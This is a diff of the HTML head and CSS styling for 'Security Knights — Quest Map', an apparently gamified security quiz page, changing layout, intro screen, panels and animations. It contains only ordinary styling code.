@@ -3,254 +3,242 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>Security Knights — Quest Map | Dayo Egonu</title>
+<title>Security Knights — Quest Map</title>
 <link href="https://fonts.googleapis.com/css2?family=Uncial+Antiqua&family=Cinzel:wght@400;600;700&family=Lato:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%;overflow:hidden;background:#090C18;}
-
 :root{
   --gold:#E8A820;--gdim:#C48A10;--gbg:rgba(232,168,32,.1);
-  --em:#2ECC8A;--embg:rgba(46,204,138,.1);
-  --crim:#E84040;--crimbg:rgba(232,64,64,.1);
+  --em:#2ECC8A;--embg:rgba(46,204,138,.12);
+  --crim:#E84040;--crimbg:rgba(232,64,64,.12);
   --surf:#111528;--bdr:#1E2D50;--txt:#E8DEBA;--muted:#7A8BAA;
   --pc:#7BA7D4;--sc:#C0976A;--kc:#E8A820;
 }
 
+/* ── INTRO ── */
+#intro{position:fixed;inset:0;z-index:1000;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;}
+#intro.done{display:none;}
+#intro-stars{position:absolute;inset:0;overflow:hidden;}
+.istar{position:absolute;border-radius:50%;background:#fff;animation:twinkle var(--d) ease-in-out infinite;}
+@keyframes twinkle{0%,100%{opacity:.1}50%{opacity:var(--o)}}
+#intro-content{position:relative;z-index:2;text-align:center;max-width:700px;padding:30px;}
+.intro-slide{display:none;flex-direction:column;align-items:center;gap:18px;animation:fadeSlide .8s ease;}
+.intro-slide.active{display:flex;}
+@keyframes fadeSlide{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.intro-emoji{font-size:5rem;filter:drop-shadow(0 0 30px rgba(232,168,32,.8));animation:float 3s ease-in-out infinite;}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+.intro-title{font-family:'Uncial Antiqua',serif;font-size:clamp(2rem,5vw,3.5rem);color:var(--gold);text-shadow:0 0 40px rgba(232,168,32,.6);letter-spacing:.05em;}
+.intro-sub{font-family:'Cinzel',serif;font-size:.9rem;color:#96A3BA;letter-spacing:.2em;text-transform:uppercase;}
+.intro-story{font-family:'Lato',sans-serif;font-size:1.05rem;color:#C8D8E8;line-height:1.85;max-width:560px;}
+.intro-story strong{color:var(--gold);}
+.intro-story em{color:#7BA7D4;}
+.intro-progress{display:flex;gap:8px;margin-top:8px;}
+.intro-dot{width:8px;height:8px;border-radius:50%;background:rgba(232,168,32,.3);transition:background .3s;}
+.intro-dot.active{background:var(--gold);}
+.intro-btn{padding:13px 36px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:10px;font-family:'Cinzel',serif;font-size:1rem;font-weight:700;color:#000;cursor:pointer;box-shadow:0 0 30px rgba(232,168,32,.5);transition:all .2s;letter-spacing:.06em;}
+.intro-btn:hover{transform:translateY(-3px);box-shadow:0 0 50px rgba(232,168,32,.8);}
+.intro-skip{position:absolute;top:20px;right:24px;font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(255,255,255,.35);cursor:pointer;border:1px solid rgba(255,255,255,.1);padding:5px 12px;border-radius:4px;transition:all .2s;}
+.intro-skip:hover{color:rgba(255,255,255,.7);border-color:rgba(255,255,255,.3);}
+#intro-canvas{position:absolute;inset:0;z-index:1;}
+
 /* ── HUD ── */
-#hud{
-  position:fixed;top:0;left:0;right:0;height:56px;z-index:100;
+#hud{position:fixed;top:0;left:0;right:0;height:56px;z-index:100;
   background:rgba(6,8,18,.98);
   border-bottom:2px solid transparent;
   border-image:linear-gradient(90deg,transparent,#E8A820,#FFD700,#E8A820,transparent) 1;
-  display:flex;align-items:center;justify-content:space-between;padding:0 16px;
-  box-shadow:0 2px 20px rgba(0,0,0,.6);
-}
-.hud-left{display:flex;align-items:center;gap:10px;}
-.hud-logo{font-family:'Uncial Antiqua',serif;font-size:1.1rem;color:var(--gold);
-  text-shadow:0 0 20px rgba(232,168,32,.6);letter-spacing:.05em;}
-.nav-a{font-size:11px;color:var(--muted);text-decoration:none;padding:5px 9px;
-  border-radius:5px;border:1px solid transparent;transition:all .2s;font-family:'Cinzel',serif;}
+  display:flex;align-items:center;justify-content:space-between;padding:0 12px;
+  box-shadow:0 2px 20px rgba(0,0,0,.6);}
+.hud-left{display:flex;align-items:center;gap:8px;}
+.hud-logo{font-family:'Uncial Antiqua',serif;font-size:1.05rem;color:var(--gold);text-shadow:0 0 16px rgba(232,168,32,.5);}
+.nav-a{font-size:11px;color:var(--muted);text-decoration:none;padding:5px 9px;border-radius:5px;border:1px solid transparent;transition:all .2s;font-family:'Cinzel',serif;white-space:nowrap;}
 .nav-a:hover{color:var(--txt);border-color:var(--bdr);}
 .back-btn{color:var(--gold);border-color:rgba(232,168,32,.3);background:var(--gbg);}
-.hud-center{display:flex;align-items:center;gap:12px;}
-.rbadge{display:flex;align-items:center;gap:5px;padding:3px 10px;border-radius:5px;
-  font-family:'Cinzel',serif;font-size:11px;font-weight:600;border:1px solid;}
+.hud-center{display:flex;align-items:center;gap:10px;}
+.rbadge{display:flex;align-items:center;gap:5px;padding:3px 10px;border-radius:5px;font-family:'Cinzel',serif;font-size:11px;font-weight:600;border:1px solid;}
 .rp{color:var(--pc);border-color:rgba(123,167,212,.3);background:rgba(123,167,212,.1);}
 .rs{color:var(--sc);border-color:rgba(192,151,106,.3);background:rgba(192,151,106,.1);}
 .rk{color:var(--kc);border-color:rgba(232,168,32,.3);background:var(--gbg);}
 .xpw{display:flex;flex-direction:column;gap:2px;}
-.xplbl{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--muted);
-  display:flex;justify-content:space-between;width:120px;}
-.xpbar{width:120px;height:7px;background:#1A2040;border-radius:100px;overflow:hidden;
-  border:1px solid var(--bdr);box-shadow:0 0 8px rgba(232,168,32,.2);}
-.xpfill{height:100%;background:linear-gradient(90deg,#C48A10,#E8A820,#FFD700,#E8A820);
-  background-size:200% 100%;border-radius:100px;transition:width .8s ease;
-  animation:xpShine 2s linear infinite;}
+.xplbl{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--muted);display:flex;justify-content:space-between;width:110px;}
+.xpbar{width:110px;height:7px;background:#1A2040;border-radius:100px;overflow:hidden;border:1px solid var(--bdr);}
+.xpfill{height:100%;background:linear-gradient(90deg,#C48A10,#E8A820,#FFD700,#E8A820);background-size:200% 100%;border-radius:100px;transition:width .8s ease;animation:xpShine 2s linear infinite;}
 @keyframes xpShine{0%{background-position:-200% 0}100%{background-position:200% 0}}
 .bdgs{display:flex;gap:5px;}
-.bicon{width:28px;height:28px;border-radius:6px;border:1px solid var(--bdr);
-  background:#0D1025;display:flex;align-items:center;justify-content:center;
-  font-size:14px;opacity:.25;transition:all .3s;}
-.bicon.earned{opacity:1;border-color:var(--gold);box-shadow:0 0 12px rgba(232,168,32,.5);}
-.hud-right{display:flex;align-items:center;gap:8px;}
-#wizToggle{background:var(--gbg);border:1px solid rgba(232,168,32,.3);color:var(--gold);
-  font-family:'Cinzel',serif;font-size:11px;padding:5px 12px;border-radius:5px;cursor:pointer;
-  transition:all .2s;}
-#wizToggle:hover{background:rgba(232,168,32,.18);}
+.bicon{width:28px;height:28px;border-radius:6px;border:1px solid var(--bdr);background:#0D1025;display:flex;align-items:center;justify-content:center;font-size:14px;opacity:.2;transition:all .4s;}
+.bicon.earned{opacity:1;border-color:var(--gold);box-shadow:0 0 14px rgba(232,168,32,.6);animation:badgePop .5s ease;}
+@keyframes badgePop{0%{transform:scale(1)}40%{transform:scale(1.5) rotate(15deg)}70%{transform:scale(.9)}100%{transform:scale(1)}}
+.hud-right{display:flex;align-items:center;gap:6px;}
+.hud-btn{background:var(--gbg);border:1px solid rgba(232,168,32,.25);color:var(--muted);font-family:'Cinzel',serif;font-size:10px;padding:5px 10px;border-radius:5px;cursor:pointer;transition:all .2s;white-space:nowrap;}
+.hud-btn:hover{color:var(--gold);border-color:rgba(232,168,32,.5);}
+.hud-btn.active{color:var(--gold);border-color:rgba(232,168,32,.5);background:rgba(232,168,32,.15);}
 
-/* ── CANVAS ── */
-#gc{position:fixed;top:56px;left:0;display:block;cursor:default;}
+/* ── LAYOUT ── */
+#layout{position:fixed;top:56px;bottom:0;left:0;right:0;display:flex;}
+#sidebar-left{width:230px;flex-shrink:0;background:linear-gradient(180deg,#0A0D1E,#0D1025);border-right:1px solid rgba(232,168,32,.12);display:flex;flex-direction:column;overflow:hidden;transition:width .3s;}
+#sidebar-left.collapsed{width:0;overflow:hidden;}
+#sb-inner{flex:1;overflow-y:auto;padding:10px;}
+#sb-inner::-webkit-scrollbar{width:3px;}
+#sb-inner::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-title{font-family:'Cinzel',serif;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.2em;color:var(--gold);margin-bottom:10px;padding:8px 4px 4px;border-bottom:1px solid rgba(232,168,32,.1);}
+.sb-tier{margin-bottom:12px;}
+.sb-tier-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px;}
+.sb-tier-name{font-family:'Cinzel',serif;font-size:11px;font-weight:600;}
+.sb-tier-cnt{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--muted);}
+.sb-item{padding:6px 8px;border-radius:6px;border:1px solid transparent;margin-bottom:3px;cursor:pointer;transition:all .15s;position:relative;}
+.sb-item:hover{background:rgba(232,168,32,.06);border-color:rgba(232,168,32,.15);}
+.sb-item.active{background:rgba(232,168,32,.1);border-color:rgba(232,168,32,.3);}
+.sb-item.done{opacity:.55;}
+.sb-item.locked{opacity:.25;cursor:not-allowed;pointer-events:none;}
+.sb-name{font-size:10.5px;font-weight:600;color:var(--txt);margin-bottom:2px;}
+.sb-meta{font-size:9px;color:var(--muted);font-family:'JetBrains Mono',monospace;display:flex;align-items:center;gap:4px;}
+.sb-xp{background:var(--gbg);border:1px solid rgba(232,168,32,.2);color:var(--gold);padding:1px 4px;border-radius:3px;font-size:8px;font-weight:700;}
+.sb-check{position:absolute;right:6px;top:50%;transform:translateY(-50%);font-size:10px;}
+.sb-reset{width:calc(100% - 8px);margin:4px;padding:7px;background:none;border:1px solid rgba(232,64,64,.3);border-radius:6px;color:rgba(232,64,64,.6);font-family:'Cinzel',serif;font-size:9px;cursor:pointer;transition:all .2s;letter-spacing:.05em;}
+.sb-reset:hover{border-color:var(--crim);color:var(--crim);background:rgba(232,64,64,.05);}
+
+/* ── MAP AREA ── */
+#map-area{flex:1;position:relative;overflow:hidden;}
+#gc{display:block;}
 
 /* ── QUESTION PANEL ── */
-#qpanel{
-  position:fixed;bottom:0;left:0;right:300px;
-  background:linear-gradient(180deg,rgba(8,10,24,.96),rgba(10,13,30,.99));
-  border-top:2px solid var(--gold);
-  border-radius:18px 18px 0 0;
-  padding:20px 28px 24px;
-  transform:translateY(100%);
-  transition:transform .45s cubic-bezier(.34,1.2,.64,1);
-  z-index:50;max-height:70vh;overflow-y:auto;
-  box-shadow:0 -8px 40px rgba(232,168,32,.15),0 -2px 0 rgba(232,168,32,.3);
-}
+#qpanel{position:absolute;bottom:0;left:0;right:0;
+  background:linear-gradient(180deg,rgba(7,9,22,.97),rgba(9,12,28,.99));
+  border-top:2px solid var(--gold);border-radius:18px 18px 0 0;
+  padding:18px 24px 22px;
+  transform:translateY(100%);transition:transform .4s cubic-bezier(.34,1.1,.64,1);
+  z-index:50;max-height:72vh;overflow-y:auto;
+  box-shadow:0 -6px 40px rgba(232,168,32,.15);}
 #qpanel.open{transform:translateY(0);}
 #qpanel::-webkit-scrollbar{width:3px;}
 #qpanel::-webkit-scrollbar-thumb{background:var(--bdr);}
-.qp-header{display:flex;align-items:flex-start;justify-content:space-between;
-  margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid rgba(232,168,32,.15);}
-.qp-tag{font-family:'Cinzel',serif;font-size:11px;font-weight:600;
-  padding:3px 10px;border-radius:4px;border:1px solid;letter-spacing:.05em;}
-.qp-xp{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;
-  color:var(--gold);background:var(--gbg);border:1px solid rgba(232,168,32,.25);
-  padding:4px 10px;border-radius:5px;box-shadow:0 0 10px rgba(232,168,32,.2);}
-.qp-title{font-family:'Cinzel',serif;font-size:1.3rem;font-weight:700;
-  margin-bottom:10px;
-  background:linear-gradient(135deg,#E8DEBA,#FFD700);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-.qp-body{font-size:.88rem;color:#B8CCDC;line-height:1.75;margin-bottom:14px;}
-.codebox{background:rgba(4,6,16,.85);border:1px solid rgba(123,167,212,.2);
-  border-left:3px solid rgba(123,167,212,.5);border-radius:8px;
-  padding:12px 16px;margin:12px 0;font-family:'JetBrains Mono',monospace;
-  font-size:.75rem;line-height:1.7;overflow-x:auto;white-space:pre;}
-.opts{display:flex;flex-direction:column;gap:7px;margin-top:14px;}
-.opt{width:100%;text-align:left;padding:11px 16px;
-  background:rgba(17,21,40,.8);border:1px solid var(--bdr);border-radius:9px;
-  color:var(--txt);font-size:.875rem;cursor:pointer;
-  transition:all .2s cubic-bezier(.34,1.4,.64,1);display:flex;align-items:center;gap:10px;}
-.opt:hover:not(:disabled){border-color:var(--gold);background:var(--gbg);transform:translateX(5px);
-  box-shadow:-3px 0 0 var(--gold),0 0 15px rgba(232,168,32,.1);}
-.opt.correct{border-color:var(--em);background:rgba(46,204,138,.12);
-  box-shadow:0 0 20px rgba(46,204,138,.25);}
-.opt.wrong{border-color:var(--crim);background:rgba(232,64,64,.12);}
+.qp-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid rgba(232,168,32,.12);}
+.qp-tag{font-family:'Cinzel',serif;font-size:11px;font-weight:600;padding:3px 10px;border-radius:4px;border:1px solid;}
+.qp-xp{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;color:var(--gold);background:var(--gbg);border:1px solid rgba(232,168,32,.3);padding:4px 10px;border-radius:5px;}
+.qp-title{font-family:'Cinzel',serif;font-size:1.25rem;font-weight:700;margin-bottom:8px;background:linear-gradient(135deg,#E8DEBA,#FFD700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.qp-body{font-size:.88rem;color:#B8CCDC;line-height:1.75;margin-bottom:12px;}
+.codebox{background:rgba(4,6,16,.9);border:1px solid rgba(100,140,210,.2);border-left:3px solid rgba(100,140,210,.5);border-radius:8px;padding:12px 16px;margin:10px 0;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.7;overflow-x:auto;white-space:pre;}
+.opts{display:flex;flex-direction:column;gap:7px;margin-top:12px;}
+.opt{width:100%;text-align:left;padding:12px 16px;background:rgba(15,18,38,.85);border:1px solid rgba(30,45,80,.9);border-radius:9px;color:var(--txt);font-size:.875rem;cursor:pointer;transition:all .2s cubic-bezier(.34,1.4,.64,1);display:flex;align-items:center;gap:10px;}
+.opt:hover:not(:disabled){border-color:var(--gold);background:var(--gbg);transform:translateX(5px);box-shadow:-3px 0 0 var(--gold);}
+.opt.correct{border-color:var(--em) !important;background:var(--embg) !important;box-shadow:0 0 18px rgba(46,204,138,.2);}
+.opt.wrong{border-color:var(--crim) !important;background:var(--crimbg) !important;}
 .opt:disabled{cursor:not-allowed;}
-.oltr{width:24px;height:24px;border-radius:50%;
-  background:rgba(232,168,32,.1);border:1px solid rgba(232,168,32,.3);
-  display:flex;align-items:center;justify-content:center;
-  font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;flex-shrink:0;}
-.expl{margin-top:12px;padding:12px 16px;border-radius:9px;
-  font-size:.84rem;line-height:1.65;display:none;}
+.oltr{width:26px;height:26px;border-radius:50%;background:rgba(232,168,32,.15);border:1px solid rgba(232,168,32,.4);display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:#FFD700;flex-shrink:0;}
+.opt.correct .oltr{background:rgba(46,204,138,.2);border-color:var(--em);color:var(--em);}
+.opt.wrong .oltr{background:rgba(232,64,64,.2);border-color:var(--crim);color:var(--crim);}
+.expl{margin-top:12px;padding:12px 16px;border-radius:9px;font-size:.84rem;line-height:1.65;display:none;}
 .expl.show{display:block;}
-.expl.ck{background:rgba(46,204,138,.1);border:1px solid rgba(46,204,138,.3);
-  color:#A0DFC0;border-left:3px solid var(--em);}
-.expl.wk{background:rgba(232,64,64,.1);border:1px solid rgba(232,64,64,.3);
-  color:#DFA0A0;border-left:3px solid var(--crim);}
-.nxt{margin-top:14px;padding:10px 24px;
-  background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);
-  border:none;border-radius:8px;font-family:'Cinzel',serif;
-  font-size:.88rem;font-weight:700;color:#000;cursor:pointer;
-  box-shadow:0 0 18px rgba(232,168,32,.35);transition:all .2s;display:none;}
+.expl.ck{background:var(--embg);border:1px solid rgba(46,204,138,.3);color:#A8E8C0;border-left:3px solid var(--em);}
+.expl.wk{background:var(--crimbg);border:1px solid rgba(232,64,64,.3);color:#E8B0B0;border-left:3px solid var(--crim);}
+.nxt{margin-top:14px;padding:10px 26px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.88rem;font-weight:700;color:#000;cursor:pointer;box-shadow:0 0 18px rgba(232,168,32,.35);transition:all .2s;display:none;letter-spacing:.05em;}
 .nxt.show{display:inline-block;}
-.nxt:hover{transform:translateY(-2px) scale(1.03);box-shadow:0 0 30px rgba(232,168,32,.6);}
+.nxt:hover{transform:translateY(-2px);box-shadow:0 0 30px rgba(232,168,32,.6);}
 
 /* ── WIZARD PANEL ── */
-#wpanel{
-  position:fixed;top:56px;right:0;bottom:0;width:300px;
-  background:linear-gradient(180deg,rgba(8,10,24,.99),rgba(10,13,30,.99));
-  border-left:1px solid rgba(232,168,32,.15);
-  display:flex;flex-direction:column;z-index:60;
-  transform:translateX(0);transition:transform .3s ease;
-}
-#wpanel.hidden{transform:translateX(300px);}
-.whdr{padding:12px 14px;border-bottom:1px solid rgba(232,168,32,.15);
-  display:flex;align-items:center;gap:9px;flex-shrink:0;
-  background:rgba(232,168,32,.05);}
-.wav{width:36px;height:36px;background:radial-gradient(circle,rgba(232,168,32,.2),rgba(232,168,32,.05));
-  border:1px solid rgba(232,168,32,.4);border-radius:8px;
-  display:flex;align-items:center;justify-content:center;font-size:18px;
-  box-shadow:0 0 12px rgba(232,168,32,.2);}
+#wpanel{width:280px;flex-shrink:0;background:linear-gradient(180deg,rgba(8,10,24,.99),rgba(10,13,30,.99));border-left:1px solid rgba(232,168,32,.12);display:flex;flex-direction:column;transition:width .3s;overflow:hidden;}
+#wpanel.collapsed{width:0;}
+.whdr{padding:12px 14px;border-bottom:1px solid rgba(232,168,32,.12);display:flex;align-items:center;gap:9px;flex-shrink:0;background:rgba(232,168,32,.04);}
+.wav{width:36px;height:36px;background:radial-gradient(circle,rgba(232,168,32,.2),rgba(232,168,32,.05));border:1px solid rgba(232,168,32,.4);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;}
 .wname{font-family:'Cinzel',serif;font-size:.88rem;font-weight:700;color:#FFD700;}
 .wsub{font-size:10px;color:var(--muted);}
 .wmsgs{flex:1;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:7px;}
 .wmsgs::-webkit-scrollbar{width:3px;}
 .wmsgs::-webkit-scrollbar-thumb{background:var(--bdr);}
 .wm{font-size:.79rem;line-height:1.6;padding:9px 11px;border-radius:9px;}
-.wm.wiz{background:rgba(17,21,40,.9);border:1px solid rgba(232,168,32,.1);}
-.wm.user{background:rgba(232,168,32,.1);border:1px solid rgba(232,168,32,.2);align-self:flex-end;}
+.wm.wiz{background:rgba(15,18,38,.9);border:1px solid rgba(232,168,32,.1);}
+.wm.user{background:rgba(232,168,32,.08);border:1px solid rgba(232,168,32,.2);align-self:flex-end;}
 .wm strong{color:var(--gold);}
-.wtyp{display:flex;align-items:center;gap:4px;padding:9px 11px;
-  background:rgba(17,21,40,.9);border:1px solid var(--bdr);
-  border-radius:9px;width:fit-content;}
-.wtyp span{width:5px;height:5px;border-radius:50%;background:var(--muted);
-  animation:td 1.2s ease-in-out infinite;}
+.wtyp{display:flex;align-items:center;gap:4px;padding:9px 11px;background:rgba(15,18,38,.9);border:1px solid var(--bdr);border-radius:9px;width:fit-content;}
+.wtyp span{width:5px;height:5px;border-radius:50%;background:var(--muted);animation:td 1.2s ease-in-out infinite;}
 .wtyp span:nth-child(2){animation-delay:.2s;}
 .wtyp span:nth-child(3){animation-delay:.4s;}
 @keyframes td{0%,60%,100%{opacity:.3;transform:scale(1)}30%{opacity:1;transform:scale(1.3)}}
-.hints{display:flex;flex-wrap:wrap;gap:4px;padding:0 9px 6px;}
-.hbtn{font-size:10px;padding:3px 7px;background:none;border:1px solid var(--bdr);
-  border-radius:4px;color:var(--muted);cursor:pointer;transition:all .2s;font-weight:600;}
+.hints{display:flex;flex-wrap:wrap;gap:4px;padding:0 8px 6px;}
+.hbtn{font-size:10px;padding:4px 8px;background:rgba(15,18,38,.8);border:1px solid var(--bdr);border-radius:5px;color:#96A3BA;cursor:pointer;transition:all .2s;font-weight:600;}
 .hbtn:hover{color:var(--gold);border-color:rgba(232,168,32,.4);background:var(--gbg);}
-.winput-wrap{padding:8px;border-top:1px solid rgba(232,168,32,.1);flex-shrink:0;}
-.winput-row{display:flex;gap:5px;background:rgba(4,6,16,.8);
-  border:1px solid rgba(232,168,32,.2);border-radius:9px;padding:6px 8px;}
-.winput-row:focus-within{border-color:var(--gold);box-shadow:0 0 12px rgba(232,168,32,.15);}
-.winput{flex:1;background:none;border:none;outline:none;
-  color:var(--txt);font-size:.79rem;font-family:'Lato',sans-serif;}
-.winput::placeholder{color:var(--muted);}
-.wsend{background:none;border:none;cursor:pointer;color:var(--gold);
-  font-size:13px;padding:2px 5px;opacity:.7;transition:opacity .2s;}
+.winput-wrap{padding:8px;border-top:1px solid rgba(232,168,32,.08);flex-shrink:0;}
+.winput-row{display:flex;gap:5px;background:rgba(4,6,16,.85);border:1px solid rgba(232,168,32,.2);border-radius:9px;padding:6px 8px;}
+.winput-row:focus-within{border-color:var(--gold);}
+.winput{flex:1;background:none;border:none;outline:none;color:var(--txt);font-size:.79rem;font-family:'Lato',sans-serif;}
+.winput::placeholder{color:rgba(122,139,170,.5);}
+.wsend{background:none;border:none;cursor:pointer;color:var(--gold);font-size:16px;padding:2px 4px;opacity:.8;transition:opacity .2s;}
 .wsend:hover{opacity:1;}
 
 /* ── MODALS ── */
-.overlay{position:fixed;inset:0;background:rgba(6,8,18,.95);
-  backdrop-filter:blur(12px);z-index:200;display:flex;
-  align-items:center;justify-content:center;padding:20px;}
+.overlay{position:fixed;inset:0;background:rgba(6,8,18,.96);backdrop-filter:blur(12px);z-index:500;display:flex;align-items:center;justify-content:center;padding:20px;}
 .overlay.hidden{display:none;}
-.mcard{background:linear-gradient(135deg,rgba(14,11,28,.98),rgba(9,12,24,.98));
-  border:1px solid rgba(232,168,32,.4);border-radius:16px;padding:30px;
-  max-width:420px;width:100%;
-  box-shadow:0 0 80px rgba(232,168,32,.2),0 0 160px rgba(50,20,100,.15);
-  position:relative;}
-.mcard::before{content:'⚔️';position:absolute;top:-18px;left:50%;
-  transform:translateX(-50%);font-size:1.8rem;
-  filter:drop-shadow(0 0 10px rgba(232,168,32,.6));}
-.mcard h2{font-family:'Uncial Antiqua',serif;font-size:1.5rem;
-  background:linear-gradient(135deg,#E8A820,#FFD700);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
-  text-align:center;margin-bottom:8px;}
+.mcard{background:linear-gradient(135deg,rgba(14,11,28,.99),rgba(9,12,24,.99));border:1px solid rgba(232,168,32,.4);border-radius:16px;padding:30px;max-width:420px;width:100%;box-shadow:0 0 80px rgba(232,168,32,.2);position:relative;}
+.mcard::before{content:'⚔️';position:absolute;top:-18px;left:50%;transform:translateX(-50%);font-size:1.8rem;}
+.mcard h2{font-family:'Uncial Antiqua',serif;font-size:1.4rem;background:linear-gradient(135deg,#E8A820,#FFD700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-align:center;margin-bottom:8px;}
 .mcard p{color:var(--muted);font-size:.84rem;line-height:1.6;margin-bottom:16px;text-align:center;}
-.minput{width:100%;padding:10px 12px;background:rgba(4,6,18,.9);
-  border:1px solid var(--bdr);border-radius:8px;color:var(--txt);
-  font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;
-  margin-bottom:7px;transition:border-color .2s;}
+.minput{width:100%;padding:10px 12px;background:rgba(4,6,18,.9);border:1px solid var(--bdr);border-radius:8px;color:var(--txt);font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;margin-bottom:7px;transition:border-color .2s;}
 .minput:focus{border-color:var(--gold);}
-.mnote{font-size:10px;color:var(--muted);text-align:center;margin-bottom:14px;
-  font-family:'JetBrains Mono',monospace;}
+.mnote{font-size:10px;color:var(--muted);text-align:center;margin-bottom:14px;font-family:'JetBrains Mono',monospace;}
 .macts{display:flex;gap:8px;}
-.bgold{flex:1;padding:10px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);
-  border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.85rem;
-  font-weight:700;color:#000;cursor:pointer;transition:all .2s;
-  box-shadow:0 0 16px rgba(232,168,32,.35);}
-.bgold:hover{transform:translateY(-2px);box-shadow:0 0 28px rgba(232,168,32,.6);}
-.bghost{padding:10px 14px;background:none;border:1px solid var(--bdr);
-  border-radius:8px;color:var(--muted);font-size:.85rem;cursor:pointer;transition:all .2s;}
+.bgold{flex:1;padding:10px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.85rem;font-weight:700;color:#000;cursor:pointer;transition:all .2s;box-shadow:0 0 16px rgba(232,168,32,.35);}
+.bgold:hover{transform:translateY(-2px);}
+.bghost{padding:10px 14px;background:none;border:1px solid var(--bdr);border-radius:8px;color:var(--muted);font-size:.85rem;cursor:pointer;transition:all .2s;}
 .bghost:hover{border-color:var(--txt);color:var(--txt);}
-.bdgoverlay{position:fixed;inset:0;background:rgba(6,8,18,.92);
-  backdrop-filter:blur(14px);z-index:300;display:flex;
-  align-items:center;justify-content:center;padding:20px;}
+.bdgoverlay{position:fixed;inset:0;background:rgba(6,8,18,.93);backdrop-filter:blur(14px);z-index:600;display:flex;align-items:center;justify-content:center;padding:20px;}
 .bdgoverlay.hidden{display:none;}
-.bdgcard{background:linear-gradient(135deg,rgba(20,14,38,.99),rgba(10,8,24,.99));
-  border:2px solid var(--gold);border-radius:20px;padding:36px;
-  max-width:320px;width:100%;text-align:center;
-  box-shadow:0 0 100px rgba(232,168,32,.4),inset 0 0 60px rgba(232,168,32,.04);}
-.bdgemoji{font-size:4rem;display:block;margin-bottom:14px;
-  animation:flt 3s ease-in-out infinite;
-  filter:drop-shadow(0 0 20px rgba(232,168,32,.8));}
+.bdgcard{background:linear-gradient(135deg,rgba(20,14,38,.99),rgba(10,8,24,.99));border:2px solid var(--gold);border-radius:20px;padding:36px;max-width:320px;width:100%;text-align:center;box-shadow:0 0 100px rgba(232,168,32,.4);}
+.bdgemoji{font-size:4rem;display:block;margin-bottom:14px;animation:flt 3s ease-in-out infinite;filter:drop-shadow(0 0 20px rgba(232,168,32,.8));}
 @keyframes flt{0%,100%{transform:translateY(0)}50%{transform:translateY(-9px)}}
-.bdgcard h2{font-family:'Uncial Antiqua',serif;font-size:1.7rem;
-  background:linear-gradient(135deg,#E8A820,#FFD700,#FFF8DC);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
-  margin-bottom:7px;}
+.bdgcard h2{font-family:'Uncial Antiqua',serif;font-size:1.6rem;background:linear-gradient(135deg,#E8A820,#FFD700,#FFF8DC);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:7px;}
 .bdgcard p{color:var(--muted);font-size:.86rem;margin-bottom:18px;}
-.bdgclose{padding:9px 24px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);
-  border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.86rem;
-  font-weight:700;color:#000;cursor:pointer;box-shadow:0 0 18px rgba(232,168,32,.4);}
+.bdgclose{padding:9px 24px;background:linear-gradient(135deg,#C48A10,#E8A820,#FFD700);border:none;border-radius:8px;font-family:'Cinzel',serif;font-size:.86rem;font-weight:700;color:#000;cursor:pointer;}
 
-/* Particles */
-.pt{position:fixed;pointer-events:none;z-index:9999;border-radius:50%;
-  animation:ptfly .8s ease-out forwards;}
+/* Particles & XP popup */
+.pt{position:fixed;pointer-events:none;z-index:9999;border-radius:50%;animation:ptfly .8s ease-out forwards;}
 @keyframes ptfly{0%{transform:translate(0,0);opacity:1}100%{transform:translate(var(--tx),var(--ty));opacity:0}}
-
-/* XP popup */
-.xppop{position:fixed;pointer-events:none;z-index:9999;
-  font-family:'Cinzel',serif;font-size:1.3rem;font-weight:700;color:#FFD700;
-  text-shadow:0 0 12px rgba(232,168,32,.8);
-  animation:xppopAnim 1.4s ease-out forwards;}
-@keyframes xppopAnim{0%{transform:translateY(0);opacity:1}100%{transform:translateY(-80px);opacity:0}}
+.xppop{position:fixed;pointer-events:none;z-index:9999;font-family:'Cinzel',serif;font-size:1.4rem;font-weight:700;color:#FFD700;text-shadow:0 0 12px rgba(232,168,32,.9);animation:xppop 1.6s ease-out forwards;}
